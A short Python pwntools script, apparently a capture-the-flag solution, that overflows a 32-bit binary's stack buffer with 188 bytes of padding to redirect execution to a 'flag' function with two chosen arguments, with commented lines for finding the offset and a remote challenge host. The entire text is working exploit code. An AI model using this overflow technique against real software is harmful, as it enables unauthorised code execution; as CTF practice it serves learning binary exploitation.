from pwn import *
import string

# context(arch="i386", os="linux")

elf = ELF("./vuln", checksec=False)
p = elf.process()
# p = remote('188.166.156.174', '31540')

# # Finding eip-offset
# p.sendline(cyclic(512))
# p.wait()
# eip_offset = cyclic_find(p.corefile.eip)	# eip_offset = 188
# p = elf.process()

flag_func = elf.symbols["flag"]
arg1 = 0xdeadbeef
arg2 = 0xc0ded00d

payload  = "A" * 188
payload += p32(flag_func)
payload += "JUNK"
payload += p32(arg1)
payload += p32(arg2)

p.sendlineafter("You know who are 0xDiablos:", payload)

p.interactive()